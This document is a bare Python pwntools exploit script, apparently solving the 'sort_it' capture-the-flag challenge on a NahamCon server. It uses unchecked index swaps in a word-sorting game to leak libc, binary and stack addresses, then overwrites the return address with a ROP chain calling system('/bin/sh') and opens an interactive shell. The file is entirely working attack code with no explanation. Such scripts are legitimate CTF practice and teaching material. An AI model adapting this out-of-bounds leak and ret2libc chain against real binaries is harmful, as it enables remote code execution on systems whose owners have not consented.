#!/usr/bin/env python
from pwn import *

context.binary = elf = ELF('sort_it')
libc = ELF('libc-2.31.so')
p = remote("challenge.nahamcon.com", 30412)

# context.log_level = "debug"
# p = process(elf.path)
# gdb.attach(p, 'init-gef\npie break *0x15D8')

def play_round(select_idx, to_replace_idx, sort="n"):
    p.sendlineafter("word you want to select: ", str(select_idx))
    p.sendlineafter("to replace it with: ", str(to_replace_idx))
    p.recvuntil("\n\n")
    data = []
    for line in p.recvuntil("\n\n")[:-2].split("\n"):
        _, word = line.split(".")
        data.append(word[1:])
    p.sendlineafter("sorted? [y/n]: ", sort)
    return data

p.sendlineafter("key to continue...", "")

d1 = play_round(10, 14)
leak = u64(d1[-1].ljust(8, '\x00'))
libc.address = leak - 0x270b3
log.info("Libc: 0x{:x}".format(libc.address))


play_round(14, 10)


d2 = play_round(10, 18)
leak = u64(d2[-1].ljust(8, '\x00'))
elf.address = leak - 0x139f
log.info("ELF: 0x{:x}".format(elf.address))

play_round(18, 10)

d3 = play_round(11, 10)
leak = u64(d3[-1].ljust(8, '\x00'))
array_addr = leak - 0x150
log.info("Array: 0x{:x}".format(array_addr))

words = play_round(10, 11)

sorted_words = sorted(words)

for idx, word in enumerate(sorted_words):
    words = play_round(idx + 1, words.index(word) + 1)

mask = 0xffffffffffffffff

# one_gadgets = list(map(int, subprocess.check_output(["one_gadget", "-r", "libc-2.31.so"]).split()))
# # 3 gadgets
# one_gadget = libc.address + one_gadgets[2]

pop_rdi = elf.address + 0x0000000000001643
bin_sh = next(libc.search("/bin/sh"))
system = libc.symbols["system"]
ret = elf.address + 0x000000000000101a

play_round(1, 1, "n" * 8 + p64(pop_rdi))

target_offset = (((elf.symbols['yn'] + 8 - array_addr) / 8) & mask) + 1
ret_addr_offset = ((0x68 / 8) & mask) + 1


play_round(ret_addr_offset, target_offset, "n" * 8 + p64(bin_sh))
play_round(ret_addr_offset + 1, target_offset, "n" * 8 + p64(ret))
play_round(ret_addr_offset + 2, target_offset, "n" * 8 + p64(system))
play_round(ret_addr_offset + 3, target_offset, "y")


p.interactive()

